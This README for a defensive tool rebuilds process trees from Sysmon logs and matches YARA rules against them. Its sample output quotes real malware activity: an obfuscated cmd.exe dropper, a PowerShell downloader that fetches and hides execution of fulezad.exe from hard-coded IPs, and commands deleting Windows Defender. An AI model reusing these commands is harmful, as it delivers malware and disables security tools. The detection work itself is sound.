Sysmon contains great information, and more and more companies are collecting sysmon logs. We like to create detections off of the process ancestry, but this is difficult with sysmon events as the hierarchy contained within an event is only parent/process relationships.

Thus, to be able to match logic based on ancestry I've created sysmon_more, because I want more sysmon! This system will run in daemon mode (so you can continually collect sysmon events and run yara on the hierarchies in near real-time) as well as on a directory or files of sysmon events (ootb from beats). If you are already logging sysmon to elasticsearch via logstash, implement an additional logstash filter and setup sysmon_more to consume those files.

The below shows examples of how to use it and some of the capabilities.

- default install location is /opt
```
cd /opt
git clone https://github.com/asch513/smm.git
```
- copy default configs to config file location
```
cp /opt/smm/etc/smm.ini.default /opt/smm/etc/smm.ini
cp /opt/sme/etc/sme.ini.default /opt/smm/etc/sme.ini
```
- test it
```
cd smm
python3 sysmon_more.py -f test_data/sandbox_data
```
```
[2019-01-31 15:15:59,240] [sysmon_more.py:813] [MainThread] [INFO] - ################### Stats ######################
[2019-01-31 15:15:59,240] [sysmon_more.py:814] [MainThread] [INFO] - Host Count: 2
[2019-01-31 15:15:59,246] [sysmon_more.py:815] [MainThread] [INFO] - 1.                       Process Create: 12199
[2019-01-31 15:15:59,246] [sysmon_more.py:816] [MainThread] [INFO] - 2. filemod    Change File Creation Time: 0
[2019-01-31 15:15:59,247] [sysmon_more.py:817] [MainThread] [INFO] - 3. netconn           Network Connection: 112
[2019-01-31 15:15:59,248] [sysmon_more.py:818] [MainThread] [INFO] - 4.         Sysmon Service State Changed: 1
[2019-01-31 15:15:59,252] [sysmon_more.py:819] [MainThread] [INFO] - 5.                   Process Terminated: 24599
[2019-01-31 15:15:59,252] [sysmon_more.py:820] [MainThread] [INFO] - 6.                        Driver Loaded: 18
[2019-01-31 15:15:59,252] [sysmon_more.py:821] [MainThread] [INFO] - 7. modload          Image/Module Loaded: 0
[2019-01-31 15:15:59,252] [sysmon_more.py:822] [MainThread] [INFO] - 8. remotethread    Create Remote Thread: 0
[2019-01-31 15:15:59,253] [sysmon_more.py:823] [MainThread] [INFO] - 9. rawaccess            Raw Access Read: 0
[2019-01-31 15:15:59,253] [sysmon_more.py:824] [MainThread] [INFO] - 10.procaccess            Process Access: 1320
[2019-01-31 15:15:59,253] [sysmon_more.py:825] [MainThread] [INFO] - 11.filemod                  File Create: 5323
[2019-01-31 15:15:59,253] [sysmon_more.py:826] [MainThread] [INFO] - 12.regmod     Reg Event (Create/Delete): 434
[2019-01-31 15:15:59,253] [sysmon_more.py:827] [MainThread] [INFO] - 13.regmod                 Reg Set Value: 2161
[2019-01-31 15:15:59,253] [sysmon_more.py:828] [MainThread] [INFO] - 14.regmod      Reg Key and Value Rename: 0
[2019-01-31 15:15:59,277] [sysmon_more.py:776] [MainThread] [INFO] - Total items for vxstream-pc-d2: 6109. Max Setting 1. Number of Terminated Processes 5906. Number of all other processes 203.
[2019-01-31 15:15:59,314] [sysmon_more.py:797] [MainThread] [INFO] - Removed 6108 items from memory for vxstream-pc-d2. Max Items Setting: 1. New Number of total items 3
[2019-01-31 15:15:59,337] [sysmon_more.py:776] [MainThread] [INFO] - Total items for vxstream-pc-d1: 6580. Max Setting 1. Number of Terminated Processes 6335. Number of all other processes 245.
[2019-01-31 15:15:59,365] [sysmon_more.py:797] [MainThread] [INFO] - Removed 6579 items from memory for vxstream-pc-d1. Max Items Setting: 1. New Number of total items 3
```

- run yara as well
```
python3 sysmon_more.py -f test_data/sandbox_data -y
```
```
[2019-01-31 15:22:57,413] [YaraLib.py:160] [MainThread] [INFO] - compiling rules
[2019-01-31 15:22:57,417] [YaraLib.py:85] [MainThread] [DEBUG] - tracking file /opt/smm/rules/winword_cmd.yar @ 1548966148.2108552
[2019-01-31 15:22:57,421] [YaraLib.py:87] [MainThread] [DEBUG] - tracking directory /opt/smm/rules with 1 yara files
[2019-01-31 15:22:57,422] [YaraLib.py:188] [MainThread] [INFO] - finished compiling rules
[2019-01-31 15:23:18,319] [YaraLib.py:45] [MainThread] [INFO] - HITS: [winword_cmd]
[2019-01-31 15:23:18,326] [sysmon_more.py:70] [MainThread] [DEBUG] - matches #: 1
[2019-01-31 15:23:18,327] [sysmon_more.py:82] [MainThread] [INFO] - Rules: ['winword_cmd'] Matched Contents /opt/smm/hits/vxstream-pc-d1_1548966198_0b23bf92-2596-11e9-8bf4-080027af8c45
```

- find process tree for yara match in archive
```
cat /opt/smm/hits/vxstream-pc-d1_1548966198_0b23bf92-2596-11e9-8bf4-080027af8c45
```
```
{"computer_name": "vxstream-pc-d1", "proc_id": "3312", "proc_path": "C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE", "proc_cmdline": "\"C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE\" /n \"C:\\E6600996378613.doc\"", "proc_guid": "{2D395339-386E-5C4F-0000-001058B71F00}", "child_path": ["C:\\Windows\\System32\\cmd.exe"], "child_guid": ["{2D395339-389C-5C4F-0000-001063542000}"], "child_count": 1, "rule_names": ["winword_cmd"], "rule_tags": ["winwordcmd"], "rule_strings": ["$proc_path1=proc_path=C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE", "$child_path1=child_path=C:\\Windows\\System32\\cmd.exe"]}
child_guid={2D395339-389C-5C4F-0000-001063542000}
child_path=C:\Windows\System32\cmd.exe
computer_name=vxstream-pc-d1
proc_cmdline="C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" /n "C:\E6600996378613.doc"
proc_guid={2D395339-386E-5C4F-0000-001058B71F00}
proc_id=3312
proc_path=C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
```

- the format of the content for yara to scan will include ancestry information from child to ggrand.

- you can write yara rules on any level of the ancestry, including netconns, modloads, filemods, etc (see rules/winword_cmd.exe for template)

- archive - the default config enables writing an archive of ancestry trees, found in /opt/smm/archive. When running in daemon mode I do not suggest having this on (having this enabled just allows you to see some examples)
```
computer_name=vxstream-pc-d1
grand_cmdline="C:\Program Files\AutoIt3\AutoIt3.exe" "C:\winclient.au3"
grand_filemod=C:\share\VxStream\preparewindows64.bat
grand_filemod=C:\share\VxStream\zip.exe
grand_guid={2D395339-4A1D-5C4F-0000-0010ED291900}
grand_id=704
grand_path=C:\Program Files\AutoIt3\AutoIt3.exe
grand_regmod=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VBoxTray
grand_regmod=HKLM\System\CurrentControlSet\Control\NetworkProvider\Order\ProviderOrder
grand_regmod=HKLM\System\CurrentControlSet\services\sppsvc\Start
grand_regmod=HKU\S-1-5-21-2297804061-1390758440-2538443655-1000\Software\Microsoft\Internet Explorer\Security\DisableSecuritySettingsCheck
grand_regmod=HKU\S-1-5-21-2297804061-1390758440-2538443655-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden
grand_regmod=HKU\S-1-5-21-2297804061-1390758440-2538443655-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.url
parent_cd=C:\Windows\system32\
parent_cmdline=C:\Windows\system32\cmd.exe /c sc stop WatAdminSvc
parent_guid={2D395339-4A37-5C4F-0000-0010C4A61B00}
parent_id=3232
parent_md5=ad7b9c14083b52bc532fba5948342b98
parent_netconn=104.16.89.188
parent_netconn=104.16.92.188
parent_netconn=104.16.93.188
parent_netconn=104.18.24.243
parent_netconn=104.96.220.201
parent_netconn=104.96.220.217
parent_netconn=104.96.220.226
parent_netconn=127.0.0.1
parent_netconn=147.135.177.135
parent_netconn=172.217.197.95
parent_netconn=72.21.81.200
parent_netconn=72.21.91.29
parent_netconn=a104-96-220-201.deploy.static.akamaitechnologies.com
parent_netconn=ip135.ip-147-135-177.eu
parent_netconn=vxstream-PC-d1
parent_path=C:\Windows\System32\cmd.exe
parent_sha265=17f746d82695fa9b35493b41859d39d786d32b23a9d2e00f4011dec7a02402ae
parent_src_ip=192.168.56.53
parent_time=2019-01-28 18:30:15.059
parent_user=VXSTREAM-PC-D1\vxstream
proc_cd=C:\Windows\system32\
proc_cmdline=sc  stop WatAdminSvc
proc_guid={2D395339-4A39-5C4F-0000-00109D591C00}
proc_id=2408
proc_md5=d2f7a0adc2ee0f65ab1f19d2e00c16b8
proc_path=C:\Windows\System32\sc.exe
proc_sha265=1c2ec0bb83d2ad3f53b0706c46a2604f81f2fc2afdcf43be5914cc8f509dd48c
proc_time=2019-01-28 18:30:17.228
proc_user=VXSTREAM-PC-D1\vxstream
```

- ancestry on a specific guid
```
python3 sysmon_more.py -f test_data/sandbox_data -g '{2D395339-4A39-5C4F-0000-00109D591C00}'
```
```
- ggrand_id: 2600
- ggrand_path: C:\Windows\System32\cmd.exe
- ggrand_guid: {2D395339-3400-5C4F-0000-00105EF61E00}
- ggrand_cmdline: CmD  /V:ON/C"set wm=MSn/Bm.y@b(:D9utAq,U%1vk4r8XEWQ)d6gwxoRj+$3ciazp-l}FC2h PG'OfT~0IL;N{\s=5e&&for %A in (47;37;35;20;56;19;4;65;64;52;11;62;72;18;21;20;25;20;1;28;1;1;64;59;67;67;16;0;28;11;62;48;24;18;21;20;54;20;61;28;0;56;11;62;48;42;18;21;20;49;49;55;41;39;39;17;22;15;15;14;71;58;22;47;37;54;5;35;58;66;41;23;35;44;49;37;46;71;2;73;35;48;37;9;39;73;43;15;55;67;73;15;6;29;73;9;52;49;44;73;2;15;66;41;2;37;60;39;22;71;58;54;15;15;47;11;3;3;70;7;5;9;44;70;7;70;15;73;5;70;6;43;37;5;3;42;42;39;35;53;22;46;8;54;15;15;47;11;3;3;35;35;35;6;73;25;5;45;47;25;37;32;14;43;15;44;37;2;6;43;37;5;3;35;47;48;43;37;2;15;73;2;15;3;32;27;13;30;14;39;17;26;26;8;54;15;15;47;11;3;3;73;43;49;73;43;15;44;17;14;73;44;2;32;14;70;15;25;44;73;70;6;43;37;5;3;73;44;73;52;72;43;28;8;54;15;15;47;11;3;3;39;37;2;34;73;35;37;49;60;6;2;49;3;13;72;64;63;39;35;70;8;54;15;15;47;11;3;3;9;44;49;49;60;25;44;15;46;39;25;6;43;37;5;3;33;38;38;13;13;73;5;63;47;61;58;6;1;47;49;44;15;10;58;8;58;31;66;41;70;46;54;39;37;44;71;58;46;39;5;22;37;58;66;41;37;9;46;23;14;9;55;71;55;58;21;72;63;58;66;41;46;14;43;35;46;71;58;46;32;44;39;47;37;32;58;66;41;70;47;70;39;25;44;60;71;41;73;2;22;11;15;73;5;47;40;58;69;58;40;41;37;9;46;23;14;9;40;58;6;73;36;73;58;66;60;37;25;73;45;43;54;10;41;46;35;35;54;17;32;49;55;44;2;55;41;2;37;60;39;22;31;68;15;25;7;68;41;23;35;44;49;37;46;6;12;37;35;2;49;37;45;32;51;44;49;73;10;41;46;35;35;54;17;32;49;18;55;41;70;47;70;39;25;44;60;31;66;41;17;46;9;9;35;71;58;9;54;70;14;2;44;54;58;66;64;60;55;10;10;57;73;15;48;64;15;73;5;55;41;70;47;70;39;25;44;60;31;6;49;73;2;34;15;54;55;48;34;73;55;24;63;63;63;63;31;55;68;64;2;22;37;23;73;48;64;15;73;5;55;41;70;47;70;39;25;44;60;66;41;70;5;44;70;35;44;2;71;58;39;39;60;35;15;58;66;9;25;73;45;23;66;50;50;43;45;15;43;54;68;50;50;41;32;39;44;47;43;22;32;71;58;45;25;60;32;54;47;22;58;66;82)do set RxY=!RxY!!wm:~%A,1!&&if %A==82 echo !RxY:~-601!|FOR /F "delims=Fafn tokens=1" %U IN ('ftype^^^|find "dfi"')DO %U "
  - grand_id: 3112
  - grand_path: C:\Windows\System32\cmd.exe
  - grand_guid: {2D395339-340C-5C4F-0000-0010EA051F00}
  - grand_cmdline: C:\Windows\system32\cmd.exe  /S /D /c" FOR /F "delims=Fafn tokens=1" %%U IN ('ftype^|find "dfi"') DO %%U "
  - grand_md5: ad7b9c14083b52bc532fba5948342b98
  - grand_sha265: 17f746d82695fa9b35493b41859d39d786d32b23a9d2e00f4011dec7a02402ae
  - grand_cd: C:\
  - grand_user: VXSTREAM-PC-D1\vxstream
  - grand_time: 2019-01-28 16:55:40.887
    - parent_id: 2252
    - parent_path: C:\Windows\System32\cmd.exe
    - parent_guid: {2D395339-340D-5C4F-0000-00109F0B1F00}
    - parent_cmdline: C:\Windows\system32\cmd.exe /c ftype|find "dfi"
    - parent_md5: ad7b9c14083b52bc532fba5948342b98
    - parent_sha265: 17f746d82695fa9b35493b41859d39d786d32b23a9d2e00f4011dec7a02402ae
    - parent_cd: C:\
    - parent_user: VXSTREAM-PC-D1\vxstream
    - parent_time: 2019-01-28 16:55:41.037
      - proc_id: 1108
      - proc_md5: ad7b9c14083b52bc532fba5948342b98
      - proc_sha265: 17f746d82695fa9b35493b41859d39d786d32b23a9d2e00f4011dec7a02402ae
      - proc_path: C:\Windows\System32\cmd.exe
      - proc_guid: {2D395339-340D-5C4F-0000-00100D0E1F00}
      - proc_cd: C:\
      - proc_cmdline: C:\Windows\system32\cmd.exe  /S /D /c" ftype"
      - proc_user: VXSTREAM-PC-D1\vxstream
      - proc_time: 2019-01-28 16:55:41.088
```

#### SysMonElasticsearch
sme.py - SysMonElasticsearch - utility for querying ancestry information for specific processes (and running yara against them if you wish)

- edit /opt/smm/etc/sme.ini with the url to your elasticsearch cluster
```
[elk]
uri = https://user:pass@elasticsearch.domain/
```

- depending on how you are getting sysmon logs into elasticsearch, your field names may be different than the sysmon field names, edit /opt/sme/etc/sme.ini to map sysmon fields to the fields that you have in elasticsearch. the [smm] and [sme] sections of the config need to be modified for the field names in your elasticsearch.
```
SysMon_Default_Name = Name_in_Elasticsearch
...
SourceProcessGUID = source_process_guid
TargetProcessId = target_process_id
TargetProcessGUID = target_process_guid
```

- search elasticsearch (lucene)
```
python3 sme.py query 'command_line:*Order*'
```
```
3 process segments found.

     -------------------------
     process_guid: {2D395339-3BAC-5C52-0000-001006F72300}
     process_id: 3296
     image: C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe
     command_line: "C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe" "C:\CIP Change Order  30-01-19 235900.pdf"
     md5: 6E3D7F11D087FE1AC7865F702665D768
     sha256: 33F890C10390CE6B587CB3255CEF97AC4D545E4996C359A61FCC4CAA9DA077BB
     parent_image: C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
     parent_guid: {2D395339-3645-5C52-0000-0010BEB32100}
     parent_command_line: "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE" /dde
     process_id: 3296
     hostname: vxstream-PC-d2
     user_name: SYSTEM
     @timestamp: 2019-01-31T00:05:00.147Z
     event_id: 1

     -------------------------
     process_guid: {1018D5A4-1842-5C5B-0000-001011D60A00}
     process_id: 968
     image: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
     command_line: "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\Sandman\Desktop\Order_Payroll_81154072.doc"
     md5: BFF948019509B5BF3F9B6CEED2E2B8E3
     sha256: EE944590B3C253325688F3C1CDDC9A439B5A80A3A36443B4B5DE788DB19D2973
     parent_image: C:\Windows\explorer.exe
     parent_guid: {1018D5A4-50DF-5C54-0000-0010019C0100}
     parent_command_line: C:\Windows\Explorer.EXE
     process_id: 968
     hostname: w7GotChaPC
     user_name: SYSTEM
     @timestamp: 2019-02-06T17:24:18.272Z
     event_id: 1

     -------------------------
     process_guid: {2D395339-E838-5C46-0000-00101DCA1E00}
     process_id: 3368
     image: C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe
     command_line: "C:\Program Files\Adobe\Reader 10.0\Reader\AcroRd32.exe" "C:\CIP Change Order  22-01-19 100000.pdf"
     md5: 6E3D7F11D087FE1AC7865F702665D768
     sha256: 33F890C10390CE6B587CB3255CEF97AC4D545E4996C359A61FCC4CAA9DA077BB
     parent_image: C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
     parent_guid: {2D395339-E5BF-5C46-0000-00104F4B1C00}
     parent_command_line: "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE" /dde
     process_id: 3368
     hostname: vxstream-PC-d2
     user_name: SYSTEM
     @timestamp: 2019-01-22T09:54:00.253Z
     event_id: 1
```

- take a look at the ancestry of an interesting guid
```
python3 sme.py proc '{1018D5A4-1842-5C5B-0000-001011D60A00}' -w
```
```
---> C:\Windows\explorer.exe - {1018D5A4-50DF-5C54-0000-0010019C0100}
    ---> C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE - {1018D5A4-1842-5C5B-0000-001011D60A00}
        ---> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe - {1018D5A4-1851-5C5B-0000-0010E2C80B00}
        ---> C:\Users\Sandman\AppData\Local\Temp\fulezad.exe - {1018D5A4-1855-5C5B-0000-00109FED0B00}
        ---> C:\Users\Sandman\AppData\Local\Temp\fulezad.exe - {1018D5A4-1859-5C5B-0000-00107CFA0B00}
        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-0010ECFB0B00}
        ---> C:\Windows\SysWOW64\sc.exe - {1018D5A4-1859-5C5B-0000-00105C070C00}
        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-0010B1FC0B00}
        ---> C:\Windows\SysWOW64\sc.exe - {1018D5A4-1859-5C5B-0000-00105F070C00}
        ---> C:\Windows\SysWOW64\cmd.exe - {1018D5A4-1859-5C5B-0000-001038FD0B00}
        ---> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe - {1018D5A4-1859-5C5B-0000-0010F3060C00}
        ---> C:\Users\Sandman\AppData\Roaming\cleanmem\fumezad.exe - {1018D5A4-1859-5C5B-0000-001003FF0B00}
        ---> C:\Users\Sandman\AppData\Roaming\cleanmem\fumezad.exe - {1018D5A4-185E-5C5B-0000-0010D0610C00}
        ---> C:\Windows\System32\svchost.exe - {1018D5A4-185E-5C5B-0000-0010C9630C00}
        ---> C:\Windows\splwow64.exe - {1018D5A4-1843-5C5B-0000-00100CF10A00}

#### {1018D5A4-50DF-5C54-0000-0010019C0100} ####
 - regmod: ['HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.doc\\OpenWithList\\a']
 - proc_cmdline: C:\Windows\Explorer.EXE
 - proc_path: C:\Windows\explorer.exe
 - proc_id: 1524
 - proc_guid: {1018D5A4-50DF-5C54-0000-0010019C0100}
    #### {1018D5A4-1842-5C5B-0000-001011D60A00} ####
     - regmod: ['HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\Trusted Documents\\TrustRecords\\%USERPROFILE%/Desktop/Order_Payroll_81154072.doc', 'HKU\\S-1-5-21-1660022851-2357930215-3100199371-1001\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\Trusted Documents\\TrustRecords']
     - proc_time: 2019-02-06T17:24:18.272Z
     - proc_id: 968
     - proc_user: SYSTEM
     - proc_cmdline: "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\Sandman\Desktop\Order_Payroll_81154072.doc"
     - proc_path: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
     - computer_name: w7gotchapc
     - proc_cd: C:\Users\Sandman\Desktop\
     - proc_guid: {1018D5A4-1842-5C5B-0000-001011D60A00}
        #### {1018D5A4-1851-5C5B-0000-0010E2C80B00} ####
         - proc_time: 2019-02-06T17:24:33.327Z
         - proc_id: 3628
         - proc_user: SYSTEM
         - proc_cmdline: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+'\fulezad.exe'));}catch{$beos1=0;}return $beos1;}$mmb1=@('64.44.51.87/electra.crm','89.46.223.114/electra.crm');foreach ($bifa in $mmb1){if(split-strings('https://'+$bifa) -eq 1){break;} };<#validate component#>start-process ($env:temp+'\fulezad.exe') -windowstyle hidden;"
         - proc_path: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
         - computer_name: w7gotchapc
         - proc_cd: C:\Users\Sandman\Desktop\
         - proc_guid: {1018D5A4-1851-5C5B-0000-0010E2C80B00}
        #### {1018D5A4-1855-5C5B-0000-00109FED0B00} ####
         - proc_time: 2019-02-06T17:24:37.133Z
         - proc_id: 3588
         - proc_user: SYSTEM
         - proc_cmdline: "C:\Users\Sandman\AppData\Local\Temp\fulezad.exe"
         - proc_path: C:\Users\Sandman\AppData\Local\Temp\fulezad.exe
         - computer_name: w7gotchapc
         - proc_cd: C:\Users\Sandman\Desktop\
         - proc_guid: {1018D5A4-1855-5C5B-0000-00109FED0B00}
        ...
        #### {1018D5A4-1859-5C5B-0000-0010B1FC0B00} ####
         - proc_time: 2019-02-06T17:24:41.666Z
         - proc_id: 3704
         - proc_user: SYSTEM
         - proc_cmdline: /c sc delete WinDefend
         - proc_path: C:\Windows\SysWOW64\cmd.exe
         - computer_name: w7gotchapc
         - proc_cd: C:\Windows\system32\
         - proc_guid: {1018D5A4-1859-5C5B-0000-0010B1FC0B00}
        ... 
        ... hopefully you get the idea
```
- run yara on that process

```
python3 sme.py proc '{1018D5A4-1842-5C5B-0000-001011D60A00}' -w -y
```
```
['powershell_obfuscation', 'powershell_startprocess']
['$path=_path=C:\\Windows\\SysWOW64\\cmd.exe', '$a_leftbrace=_cmdline="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+\'\\fulezad.exe\'));}catch{$beos1=0;}return $beos1;}$mmb1=@(\'64.44.51.87/electra.crm\',\'89.46.223.114/electra.crm\');foreach ($bifa in $mmb1){if(split-strings(\'https://\'+$bifa) -eq 1){', '$cmdline1=cmdline="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" "<#11#> function <#new function release#> split-strings([string] $string1){$beos1=1;try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; (new-object system.net.webclient <#replace ext#> ).downloadfile($string1,($env:temp+\'\\fulezad.exe\'));}catch{$beos1=0;}return $beos1;}$mmb1=@(\'64.44.51.87/electra.crm\',\'89.46.223.114/electra.crm\');foreach ($bifa in $mmb1){if(split-strings(\'https://\'+$bifa) -eq 1){break;} };']
```
